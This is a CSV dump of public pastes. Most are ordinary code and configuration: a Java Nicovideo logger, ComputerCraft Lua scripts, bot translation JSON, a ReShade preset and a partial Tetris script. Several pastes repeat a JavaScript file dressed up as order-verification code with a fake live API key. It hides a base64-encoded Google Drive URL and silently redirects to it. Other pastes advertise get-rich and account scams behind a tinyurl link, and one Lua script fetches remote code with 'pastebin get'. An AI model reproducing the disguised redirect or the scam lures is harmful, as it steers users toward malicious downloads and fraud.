@@ -1,0 +1,3845 @@
+id,title,username,language,date,content
+RM7Yv95a,Make $1000 15-MINUTES (BEGINNER) WM,izayarais1,JavaScript,Sunday 30th of March 2025 12:54:30 AM CDT," 
+Pdf https://tinyurl.com/methodssss
+
+
+fanXor9CGM
+"
+eLMRMNQE,CommentFilterLogger.java,filledwithgarbages,Java,Sunday 30th of March 2025 12:52:00 AM CDT,"package extensions;
+
+import dareka.NLMain;
+import dareka.common.Logger;
+import dareka.extensions.Extension2;
+import dareka.extensions.ExtensionManager;
+import dareka.processor.HttpHeader;
+import dareka.processor.HttpRequestHeader;
+import dareka.processor.Resource;
+import dareka.processor.StringResource;
+import dareka.processor.Processor;
+import dareka.common.json.Json;
+import dareka.common.json.JsonArray;
+import dareka.common.json.JsonObject;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.Socket;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.regex.Pattern;
+import java.util.regex.Matcher;
+import javax.swing.JTextArea;
+import javax.swing.JScrollPane;
+
+public class CommentFilterLogger implements Extension2, Processor {
+    
+    public static final int REVISION = 250330;
+    public static final String VER_STRING = ""CommentFilterLogger_"" + REVISION;
+    
+    private static final String[] PROCESSOR_SUPPORTED_METHODS = { ""POST"" };
+    private static final Pattern PROCESSOR_SUPPORTED_PATTERN = Pattern.compile(
+            ""^https?://www\\.nicovideo\\.jp/cache/filter_logs"");
+    
+    private static JTextArea logArea;
+    
+    private static final int BUFFER_SIZE = 8192;
+    private static final int MAX_LOG_LENGTH = 100000;
+    
+    private static final int MAX_FILTER_VALUE_LENGTH = 50;  // フィルター表現の最大長
+
+    // Extension2 interface
+    public void registerExtensions(ExtensionManager mgr) {
+        mgr.registerProcessor(this);
+        
+        if (logArea == null && NLMain.isLaunchGUI()) {
+            logArea = new JTextArea();
+            logArea.setEditable(false);
+            logArea.setLineWrap(true);
+            logArea.setWrapStyleWord(true);
+            logArea.setFont(new java.awt.Font(""MS Gothic"", java.awt.Font.PLAIN, 12));
+            JScrollPane scrollPane = new JScrollPane(logArea);
+            NLMain.addTab(""CommentFilter"", null, scrollPane, ""フィルターログ"");
+        }
+    }
+    
+    public String getVersionString() {
+        return VER_STRING;
+    }
+    
+    // Processor Interface
+    public String[] getSupportedMethods() {
+        return PROCESSOR_SUPPORTED_METHODS;
+    }
+    
+    public Pattern getSupportedURLAsPattern() {
+        return PROCESSOR_SUPPORTED_PATTERN;
+    }
+    
+    public String getSupportedURLAsString() {
+        return null;
+    }
+    
+    public Resource onRequest(HttpRequestHeader requestHeader, Socket browser) 
+            throws IOException {
+        InputStream in = browser.getInputStream();
+        BufferedReader reader = new BufferedReader(
+            new InputStreamReader(in, ""UTF-8""),
+            BUFFER_SIZE
+        );
+        
+        long contentLength = requestHeader.getContentLength();
+        if (contentLength <= 0 || contentLength > BUFFER_SIZE) {
+            return StringResource.getNotFound();
+        }
+        
+        char[] buffer = new char[(int)contentLength];
+        int bytesRead = reader.read(buffer, 0, (int)contentLength);
+        
+        if (bytesRead > 0) {
+            final String rawMessage = new String(buffer, 0, bytesRead);
+            
+            try {
+                // JSONArrayとして解析
+                JsonArray logsArray = Json.parse(rawMessage).getArray();
+                
+                // 各ログエントリーを処理
+                for (int i = 0; i < logsArray.size(); i++) {
+                    JsonObject log = logsArray.get(i).getObject();
+                    
+                    String title = log.getString(""title"", ""不明"");
+                    String userId = log.getString(""userId"", ""不明"");
+                    String comment = log.getString(""comment"", ""不明"");
+                    String videoId = log.getString(""videoId"", ""不明"");
+                    
+                    // フィルター詳細の処理
+                    JsonArray filterDetails = log.get(""filterDetails"").getArray();
+                    StringBuilder filterInfo = new StringBuilder();
+                    
+                    if (filterDetails != null) {
+                        for (int j = 0; j < filterDetails.size(); j++) {
+                            JsonObject detail = filterDetails.get(j).getObject();
+                            String type = detail.getString(""type"", ""不明"");
+                            String value = detail.getString(""value"", """");
+                            
+                            if (value.length() > MAX_FILTER_VALUE_LENGTH) {
+                                value = value.substring(0, MAX_FILTER_VALUE_LENGTH) + ""..."";
+                            }
+                            
+                            if (j > 0) filterInfo.append("", "");
+                            filterInfo.append(type);
+                            if (!value.isEmpty()) {
+                                filterInfo.append(""("").append(value).append("")"");
+                            }
+                        }
+                    }
+                    
+                    final String formattedMessage = String.format(
+                        ""[%s]\n"" +
+                        ""動画: %s\n"" +
+                        ""動画ID: %s\n"" +
+                        ""ユーザー: %s\n"" +
+                        ""コメント: %s\n"" +
+                        ""フィルター: %s\n"" +
+                        ""----------------------------------------\n"",
+                        new SimpleDateFormat(""yyyy/MM/dd HH:mm:ss"").format(new Date()),
+                        title,
+                        videoId,
+                        userId,
+                        comment,
+                        filterInfo.toString()
+                    );
+                    
+                    if (logArea != null) {
+                        javax.swing.SwingUtilities.invokeLater(() -> {
+                            if (logArea.getText().length() > MAX_LOG_LENGTH) {
+                                logArea.setText(logArea.getText()
+                                    .substring(logArea.getText().length() - MAX_LOG_LENGTH/2));
+                            }
+                            logArea.append(formattedMessage);
+                            logArea.setCaretPosition(logArea.getDocument().getLength());
+                        });
+                    }
+                }
+                
+                return new StringResource(""ok"");
+            } catch (Exception e) {
+                System.err.println(""フィルターログ処理エラー: "" + e.getMessage());
+                e.printStackTrace();
+                return StringResource.getNotFound();
+            }
+        }
+        
+        return StringResource.getNotFound();
+    }
+} "
+VCbPjFvL,Order.js,rodrigomaise99,JavaScript,Sunday 30th of March 2025 12:42:37 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/180/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+1z2Ss1TD,Binance account CW,izayarais1,JavaScript,Sunday 30th of March 2025 12:38:33 AM CDT," 
+Pdf https://tinyurl.com/methodssss
+
+
+2BT1vlNkGh
+"
+3uWM4UY5,startup,carubi,Lua,Sunday 30th of March 2025 12:36:45 AM CDT,"local monitor = peripheral.wrap(""left"")
+if not monitor then
+  print(""Kein Monitor gefunden! Bitte überprüfe die Verkabelung."")
+  return
+end
+ 
+-- Funktion zum Zeichnen des Menüs
+local function drawMenu()
+  monitor.clear()
+  monitor.setCursorPos(1,1)
+  monitor.write(""== Touchscreen Menü =="")
+  monitor.setCursorPos(1,3)
+  monitor.write(""1. Option 1"")
+  monitor.setCursorPos(1,4)
+  monitor.write(""2. Option 2"")
+  monitor.setCursorPos(1,5)
+  monitor.write(""3. Beenden"")
+end
+ 
+drawMenu()
+ 
+local running = true
+while running do
+  -- Warten auf eine Berührung auf dem Monitor
+  local event, side, x, y = os.pullEvent(""monitor_touch"")
+ 
+  -- Prüfen, ob die Berührung in einer der Menüzeilen erfolgte:
+  if y == 3 then
+    monitor.clear()
+    monitor.setCursorPos(1,1)
+    monitor.write(""Option 1 gewählt!"")
+    sleep(2)
+    drawMenu()
+  elseif y == 4 then
+    monitor.clear()
+    monitor.setCursorPos(1,1)
+    monitor.write(""Option 2 gewählt!"")
+    sleep(2)
+    drawMenu()
+  elseif y == 5 then
+    running = false
+  end
+end
+ 
+monitor.clear()
+monitor.setCursorPos(1,1)
+monitor.write(""Programm beendet."")"
+aCT8mPnN,EARN $900 INSTANTLY 2025 BT,izayarais1,JavaScript,Sunday 30th of March 2025 12:22:33 AM CDT," 
+Pdf https://tinyurl.com/methodssss
+
+
+qYX8I6rmUE
+"
+6jpXt19w,Untitled,rodrigomaise99,JavaScript,Sunday 30th of March 2025 12:11:51 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/844/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+zP9CSniH,Random Gmail Acc 1A,izayarais1,JavaScript,Sunday 30th of March 2025 12:06:38 AM CDT," 
+Pdf https://tinyurl.com/methodssss
+
+
+zCTU1wUAgX
+"
+8paYPhuu,Products.js,rodrigomaise99,JavaScript,Saturday 29th of March 2025 11:56:29 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/347/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+BniGFDHK,translation.json,NiiorBayzi,JSON,Saturday 29th of March 2025 11:35:09 PM CDT,"{
+  ""errors"": {},
+  ""texts"": {
+    ""@"": {
+      ""br"": ""**[ $randomText[🌟;⭐;✨] ] ›** Olá, eu sou o **$username[$botID]** e estou aqui para sua diversão e com várias funcionalidades. Meu prefixo é **`l.`**, para ver meus comandos utilize **`l.ajuda`**."",
+      ""en"": ""**[ $randomText[🌟;⭐;✨] ] ›** Hii, I'm **$username[$botID]** and I'm here for your fun and with a lot of functions. My prefix is **`l.`**, to see my commands use **`l.help`**.""
+    },
+    ""botinfo"": {
+      ""br"": {
+        ""description"": ""> Olá de novo internauta, gostaria de agradecê-lo por fazer parte do $username[$botID], e incentivando-me a continuar. Eu ainda não tenho servidor oficial, mas caso você queira dar uma sugestão ou relatar algum problema, use o menu abaixo. 💙✨\n\n** › Comandos:** $commandsCount\n** › Servidores:** $serverCount\n** › Membros:** $allMembersCount"",
+        ""footer"":""Criado com 💙 por"",
+        ""button"":{
+          ""suggest"":{
+            ""label"":""Sugestão"",
+            ""desc"":""Que tal me ajudar a ser cada vez melhor?""
+          },
+          ""report"":{
+            ""label"":""Reportar"",
+            ""desc"":""Reporte um erro ou um usuário.""
+          },
+          ""beta"":{
+            ""label"":""Requisição ( Beta Tester )"",
+            ""desc"":""Você pode testar os comandos antes que todo mundo.""
+          },
+          ""add"":{
+            ""desc"":""Me adicione no seu servidor.""
+          }
+        }
+      },
+      ""en"":{
+        ""description"":""> Hello again internet user, I would like to thank you for being part of the $username[$botID], and encouraging me to continue. I don't have an official server yet, but if you want to give a suggestion or report any problem, use the menu below. 💙✨ \n\n** › Commands:** $commandsCount\n** › Servers:** $serverCount\n** › Members:** $allMembersCount"",
+        ""footer"":""Created with 💙 by"",
+        ""button"":{
+          ""suggest"":{
+            ""label"":""Suggestion"",
+            ""desc"":""How about helping me to be better and better?""
+          },
+          ""report"":{
+            ""label"":""Report"",
+            ""desc"":""Report a bug or a user.""
+          },
+          ""beta"":{
+            ""label"":""Request ( Beta Test )"",
+            ""desc"":""You can test the commands before everyone else.""
+          },
+          ""add"":{
+            ""desc"":""Add me to your server.""
+          }
+        }
+      }
+    }
+  }
+}"
+GEsqmRTS,KunitsuGami_ReshadePreset.ini,Ed94,INI file,Saturday 29th of March 2025 11:32:00 PM CDT,"Techniques=ZN_SDIL@ZN_GI.fx,Tonemap@Tonemap.fx,CShade_MotionBlur@cMotionBlur.fx,ContrastAdaptiveSharpen@CAS.fx,LumaSharpen@LumaSharpen.fx,FilmGrain@FilmGrain.fx,VHS_Pro@VHSPro.fx
+TechniqueSorting=ZN_SDIL@ZN_GI.fx,Tonemap@Tonemap.fx,CShade_MotionBlur@cMotionBlur.fx,ContrastAdaptiveSharpen@CAS.fx,LumaSharpen@LumaSharpen.fx,FilmGrain@FilmGrain.fx,VHS_Pro@VHSPro.fx
+
+[CAS.fx]
+Contrast=0.293000
+Sharpening=0.600000
+
+[CMAA_2.fx]
+DebugEdges=0
+PreprocessorDefinitions=CMAA2_EXTRA_SHARPNESS=1,CMAA2_STATIC_QUALITY_PRESET=4
+UIHELP=0
+
+[cMotionBlur.fx]
+PreprocessorDefinitions=CBLEND_BLENDENABLE=TRUE
+_BlendFactor=0.204000
+_BlurMode=0
+_CShadeAlphaFactor=0.660000
+_CShadeInputTonemapOperator=0
+_CShadeOutputMode=0
+_FrameRateScaling=1
+_MipBias=0.666000
+_Scale=0.156000
+_TargetFrameRate=120.253998
+
+[cNormalize.fx]
+PreprocessorDefinitions=CBLEND_BLENDENABLE=TRUE
+_CShadeAlphaFactor=1.000000
+_CShadeInputTonemapOperator=2
+_CShadeOutputMode=0
+_Select=0
+
+[FilmGrain.fx]
+Intensity=1.000000
+Mean=0.489000
+SignalToNoiseRatio=16
+Variance=0.684000
+
+[LumaSharpen.fx]
+offset_bias=1.000000
+pattern=1
+sharp_clamp=0.220000
+sharp_strength=0.100000
+show_sharpen=0
+
+[Oilify.fx]
+PreprocessorDefinitions=OILIFY_ITERATIONS=5,OILIFY_SIZE=2.4
+Scale=1.000000
+Sharpness=1.000000
+Tuning=0.981000
+
+[Tonemap.fx]
+Bleach=0.000000
+Defog=0.000000
+Exposure=-0.018000
+FogColor=0.000000,0.000000,1.000000
+Gamma=0.966000
+Saturation=-0.007000
+
+[VHSPro.fx]
+bleedAmount=0.305000
+cutoffFadeX=25.000000
+cutoffFadeY=25.000000
+cutoffX=2.000000
+cutoffY=3.000000
+feedbackAmount=2.000000
+feedbackColor=1.000000,0.500000,0.000000
+feedbackDebug=0
+feedbackFade=0.820000
+feedbackThresh=0.100000
+filmGrainAmount=0.000000
+fisheyeBend=2.000000
+gammaCorection=1.088000
+jitterHAmount=0.113000
+jitterVAmount=0.000000
+jitterVSpeed=0.150000
+lineNoiseAmount=1.000000
+lineNoiseSpeed=5.000000
+linesFloatSpeed=1.000000
+noiseLinesNum=69
+noiseQuantizeX=0.000000
+PreprocessorDefinitions=VHSLINEARFILTER=1
+scanLineWidth=0.000000
+screenLinesNum=1440
+signalAdjustI=-0.001000
+signalAdjustQ=-0.001000
+signalAdjustY=0.004000
+signalNoiseAmount=0.032000
+signalNoisePower=0.446000
+signalNoiseType=0
+signalShiftI=0.957000
+signalShiftQ=1.068000
+signalShiftY=1.033000
+tapeNoiseAmount=0.050000
+tapeNoiseSpeed=1.000000
+tapeNoiseTH=0.630000
+twitchHFreq=1.000000
+twitchVFreq=1.062000
+VHS_Bleed=1
+VHS_BleedMode=0
+VHS_Feedback=0
+VHS_FilmGrain=0
+VHS_Filter=0
+VHS_FishEye=0
+VHS_FishEye_Hyperspace=0
+VHS_Jitter_H=0
+VHS_Jitter_V=0
+VHS_LineNoise=0
+VHS_LinesFloat=0
+VHS_ScanLines=0
+VHS_SignalTweak=1
+VHS_Stretch=0
+VHS_TapeNoise=0
+VHS_Twitch_H=0
+VHS_Twitch_V=0
+VHS_Vignette=1
+VHS_YIQNoise=0
+vignetteAmount=0.135000
+vignetteSpeed=0.325000
+
+[ZN_GI.fx]
+addR=1
+AmbientNeg=0.500000
+BlendMode=1
+debug=0
+disD=2.000000
+disM=1.000000
+distMask=0.000000
+doDenoising=1
+FOV=110.000000
+Intensity=0.310000
+LightEx=2.200000
+LigM=1.000000
+NearPlane=8.156000
+sampR=20.000000
+sLod=0
+
+"
+9CK9c9Lv,Market.js,rodrigomaise99,JavaScript,Saturday 29th of March 2025 11:25:43 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/400/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+dJR47ard,Untitled,Ratqueenkslskskwkw,JavaScript,Saturday 29th of March 2025 10:56:56 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/792/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+LVbdM4Eg,护盾炮台,jaklsfjlsak,Lua,Saturday 29th of March 2025 10:52:41 PM CDT,"local allowed = {""Ares_Xiao_Hu"", ""Destiney""}
+
+if not fs.exists(""conf"") then
+  shell.run(""pastebin get 38M5cNbZ conf"")
+  term.clear()
+end
+
+-- Check if a player is whitelisted.
+local function isWhitelisted(playerName)
+  for i = 1, #allowed do 
+    if playerName == allowed[i] then 
+      return true
+    end
+  end
+  return false
+end
+
+-- Find the shield peripheral.
+local shield = peripheral.find(""warpdriveForceFieldProjector"")
+if not shield then
+  error(""Shield not found!"")
+end
+
+-- Find and wrap all warpdrive cameras.
+local allPeripherals = peripheral.getNames()
+local cameras = {}
+for _, side in pairs(allPeripherals) do
+  if peripheral.getType(side) == ""warpdriveCamera"" then
+    print(""Camera found on "" .. side)
+    table.insert(cameras, peripheral.wrap(side))
+  end
+end
+
+print(""Control System Online. Press C to Configure."")
+
+-- Determine shield range based on upgrades.
+local _, upgrades = shield.getUpgrades()
+local Size
+if upgrades:match(""1/4 x Range"") then
+    Size = 16
+elseif upgrades:match(""2/4 x Range"") then
+    Size = 32
+elseif upgrades:match(""3/4 x Range"") then
+    Size = 48
+elseif upgrades:match(""4/4 x Range"") then
+    Size = 64
+elseif upgrades:match(""0/4 x Range"") then
+    Size = 0
+else
+    Size = 32  -- default fallback
+end
+
+-- An offset value to adjust the target coordinates.
+local OffsetValue = -1
+
+-- Calculate the adjusted target coordinates.
+local function shieldOffset(lx, ly, lz, fx, fy, fz)
+    local dx = lx - fx
+    local dy = ly - fy
+    local dz = lz - fz
+    local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
+    -- Normalize the vector.
+    dx = dx / distance
+    dy = dy / distance
+    dz = dz / distance
+    local t1x = lx + dx * OffsetValue
+    local t1y = ly + dy * OffsetValue
+    local t1z = lz + dz * OffsetValue
+    return t1x, t1y, t1z, distance
+end
+
+-- Main shield translation loop.
+local function shieldLoop()
+  while true do
+    if redstone.getInput(""bottom"") then
+      shield.enable(true)
+      for _, camera in ipairs(cameras) do
+        local count = camera.getResultsCount()
+        if count and count > 0 then
+          for i = 0, count - 1 do
+            local success, entityType, playerName, x, y, z = camera.getResult(i)
+            if success and entityType == ""minecraft:player"" and not isWhitelisted(playerName) then
+              -- Round the coordinates.
+              x = math.floor(x * 10) / 10
+              y = math.floor((y * 10) / 10) - 1
+              z = math.floor(z * 10) / 10
+              print(playerName .. "" detected at ("" .. x .. "", "" .. y .. "", "" .. z .. "")"")
+              
+              -- Get the shield's current local position.
+              local fx, fy, fz = shield.getLocalPosition()
+              -- Compute the adjusted target position.
+              local t1x, t1y, t1z, distance = shieldOffset(x, y, z, fx, fy, fz)
+              
+              -- Scale the translation by the shield's Size.
+              local tx = (t1x - fx) / Size
+              local ty = (t1y - fy) / Size
+              local tz = (t1z - fz) / Size
+              
+              shield.translation(tx, ty, tz)
+              print(""Shield translated to ("" .. tx .. "", "" .. ty .. "", "" .. tz .. "")"")
+            end
+          end
+        end
+      end
+    end
+    os.sleep(0.1)
+  end
+end
+
+-- Key listener loop for configuration.
+local function keyListener()
+  while true do
+    local event, key = os.pullEvent(""key"")
+    if key == 46 then  -- Key code 46 corresponds to C.
+      print(""C key pressed, launching 'conf' script..."")
+      parallel.waitForAny(
+        function() shell.run(""conf"") end,
+        function() while true do os.sleep(0.1) end end
+      )
+    end
+  end
+end
+
+-- Run both loops concurrently.
+parallel.waitForAny(shieldLoop, keyListener)
+"
+5PrzXtp8,Market.js,Epiphemeral,JavaScript,Saturday 29th of March 2025 10:40:39 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/143/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+M2X5sc2Y,Tetris Full Code,pwutdev,Python,Saturday 29th of March 2025 10:37:05 PM CDT,"import random
+
+piece_structures = [
+    [
+        [
+            [' ', ' ', ' ', ' '],
+            ['i', 'i', 'i', 'i'],
+            [' ', ' ', ' ', ' '],
+            [' ', ' ', ' ', ' '],
+        ],
+        [
+            [' ', 'i', ' ', ' '],
+            [' ', 'i', ' ', ' '],
+            [' ', 'i', ' ', ' '],
+            [' ', 'i', ' ', ' '],
+        ],
+    ],
+    [
+        [
+            [' ', ' ', ' ', ' '],
+            [' ', 'o', 'o', ' '],
+            [' ', 'o', 'o', ' '],
+            [' ', ' ', ' ', ' '],
+        ],
+    ],
+    [
+        [
+            [' ', ' ', ' ', ' '],
+            ['j', 'j', 'j', ' '],
+            [' ', ' ', 'j', ' '],
+            [' ', ' ', ' ', ' '],
+        ],
+        [
+            [' ', 'j', ' ', ' '],
+            [' ', 'j', ' ', ' '],
+            ['j', 'j', ' ', ' '],
+            [' ', ' ', ' ', ' '],
+        ],
+        [
+            ['j', ' ', ' ', ' '],
+            ['j', 'j', 'j', ' '],
+            [' ', ' ', ' ', ' '],
+            [' ', ' ', ' ', ' '],
+        ],
+        [
+            [' ', 'j', 'j', ' '],
+            [' ', 'j', ' ', ' '],
+            [' ', 'j', ' ', ' '],
+            [' ', ' ', ' ', ' '],
+        ],
+    ],
+    [
+        [
+            [' ', ' ', ' ', ' '],
+            ['l', 'l', 'l', ' '],
+            ['l', ' ', ' ', ' '],
+            [' ', ' ', ' ', ' '],
+        ],
+        [
+            [' ', 'l', ' ', ' '],
+            [' ', 'l', ' ', ' '],
+            [' ', 'l', 'l', ' '],
+            [' ', ' ', ' ', ' '],
+        ],
+        [
+            [' ', ' ', 'l', ' '],
+            ['l', 'l', 'l', ' '],
+            [' ', ' ', ' ', ' '],
+            [' ', ' ', ' ', ' '],
+        ],
+        [
+            ['l', 'l', ' ', ' '],
+            [' ', 'l', ' ', ' '],
+            [' ', 'l', ' ', ' '],
+            [' ', ' ', ' ', ' '],
+        ],
+    ],
+    [
+        [
+            [' ', ' ', ' ', ' '],
+            ['t', 't', 't', ' '],
+            [' ', 't', ' ', ' '],
+            [' ', ' ', ' ', ' '],
+        ],
+        [
+            [' ', 't', ' ', ' '],
+            [' ', 't', 't', ' '],
+            [' ', 't', ' ', ' '],
+            [' ', ' ', ' ', ' '],
+        ],
+        [
+            [' ', 't', ' ', ' '],
+            ['t', 't', 't', ' '],
+            [' ', ' ', ' ', ' '],
+            [' ', ' ', ' ', ' '],
+        ],
+        [
+            [' ', 't', ' ', ' '],
+            ['t', 't', ' ', ' '],
+            [' ', 't', ' ', ' '],
+            [' ', ' ', ' ', ' '],
+        ],
+    ],
+    [
+        [
+            [' ', ' ', ' ', ' '],
+            [' ', 's', 's', ' '],
+            ['s', 's', ' ', ' '],
+            [' ', ' ', ' ', ' '],
+        ],
+        [
+            ['s', ' ', ' ', ' '],
+            ['s', 's', ' ', ' '],
+            [' ', 's', ' ', ' '],
+            [' ', ' ', ' ', ' '],
+        ],
+    ],
+    [
+        [
+            [' ', ' ', ' ', ' '],
+            ['z', 'z', ' ', ' '],
+            [' ', 'z', 'z', ' '],
+            [' ', ' ', ' ', ' '],
+        ],
+        [
+            [' ', 'z', ' ', ' '],
+            ['z', 'z', ' ', ' '],
+            ['z', ' ', ' ', ' '],
+            [' ', ' ', ' ', ' '],
+        ],
+    ],
+]
+
+piece_x_count = 4
+piece_y_count = 4
+
+grid_x_count = 10
+grid_y_count = 18
+
+timer_limit = 0.5
+
+def new_sequence():
+    global sequence
+
+    sequence = list(range(len(piece_structures)))
+    random.shuffle(sequence)
+
+def new_piece():
+    global piece_x
+    global piece_y
+    global piece_type
+    global piece_rotation
+
+    piece_x = 3
+    piece_y = 0
+    piece_type = sequence.pop()
+    if len(sequence) == 0:
+        new_sequence()
+    piece_rotation = 0
+
+def reset():
+    global inert
+    global timer
+
+    inert = []
+    for y in range(grid_y_count):
+        inert.append([])
+        for x in range(grid_x_count):
+            inert[y].append(' ')
+
+    timer = 0
+    new_sequence()
+    new_piece()
+
+reset()
+
+def can_piece_move(test_x, test_y, test_rotation):
+    for y in range(piece_y_count):
+        for x in range(piece_x_count):
+            test_block_x = test_x + x
+            test_block_y = test_y + y
+
+            if (
+                piece_structures[piece_type][test_rotation][y][x] != ' ' and (
+                    test_block_x < 0
+                    or test_block_x >= grid_x_count
+                    or test_block_y >= grid_y_count
+                    or inert[test_block_y][test_block_x] != ' '
+                )
+            ):
+                return False
+
+    return True
+
+def update(dt):
+    global timer
+    global piece_y
+
+    timer += dt
+    if timer >= timer_limit:
+        timer = 0
+
